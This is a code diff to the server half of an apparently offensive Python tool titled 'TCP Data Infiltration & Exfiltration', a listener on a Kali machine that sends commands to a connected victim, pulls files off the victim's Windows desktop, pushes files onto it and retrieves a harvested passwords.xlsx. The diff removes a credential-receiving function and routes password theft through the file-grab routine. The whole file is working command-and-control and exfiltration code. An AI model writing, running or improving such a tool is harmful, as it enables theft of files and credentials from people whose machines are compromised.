@@ -1,7 +1,7 @@
 # TCP bidirectional Data transfer (Infiltration and Exfiltration) - Server
 import socket
 import os
-import pandas as pd
+# import pandas as pd
 
 
 def doGrab(conn, command, operation):
@@ -12,8 +12,8 @@ def doGrab(conn, command, operation):
     # File name example: grabbed_C:/Users/John/Desktop/audit.docx
     if operation == "grab":
         grab, sourcePathAsFileName = command.split("*")
-        path = "/home/kali/Desktop/GrabbedFiles/"
-        fileName = "grabbed_" + sourcePathAsFileName
+        path = "/home/kali/Desktop/CapturedFiles/"
+        fileName = "captured_" + sourcePathAsFileName
 
     f = open(path + fileName, 'wb')
     while True:
@@ -21,14 +21,15 @@ def doGrab(conn, command, operation):
         if data.endswith(b"DONE"):
             f.write(data[:-4])  # Write the last received bits without the word 'DONE'
             f.close()
+            print("File name: " + fileName)
+            print("Written to: " + path)
             print("[+] Transfer completed")
             break
         if b"File not found" in data:
             print("[!] Files could not be found")
             break
         f.write(data)
-        print("File name: " + fileName)
-        print("Written to: " + path)
+
 
 
 def doSend(conn, sourcePath, destinationPath, fileName):
@@ -49,28 +50,10 @@ def doSend(conn, sourcePath, destinationPath, fileName):
         return
 
 
-def receivePasswords(conn):
-    passwords = []
-    while True:
-        data = conn.recv(5000).decode()
-        if data.startswith('Credentials:'):
-            credentials = data.split("Credentials:")[1]
-            passwords.append(credentials.split(','))
-        else:
-            break
-    writePasswords(conn, passwords)
-
-
-def writePasswords(conn, credentials):
-    df = pd.DataFrame(credentials)
-    df.to_excel("passwords.xlsx", index=False, header=False)
-    print("[+] Passwords written to passwords.xlsx")
-
-
 def connect():
     s = socket.socket()
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    s.bind(("192.168.21.2", 8080))  # Change the IP Address to fit your script
+    s.bind(("10.3.130.234", 8080))  # Change the IP Address to fit your script
     s.listen(1)
     print("=" * 60)
     print("TCP Data Infiltration & Exfiltration")
@@ -94,14 +77,14 @@ def connect():
         # Example: send*C:\Users\John\Desktop\*photo.jpeg
         # Source file in Linux. Example /root/Desktop
         elif "send" in command:
-            sendCmd, destination, fileName = command.split("*")
+            sendCmd, destinationPath, fileName = command.split("*")
             source = input("Source path: ")
             conn.send(command.encode())
-            doSend(conn, source, destination, fileName)
+            doSend(conn, source, destinationPath, fileName)
 
         elif "searchExcel" in command:
             conn.send(command.encode())
-            receivePasswords(conn)
+            doGrab(conn, "grab*passwords.xlsx", "grab")
 
         else:
             conn.send(command.encode())
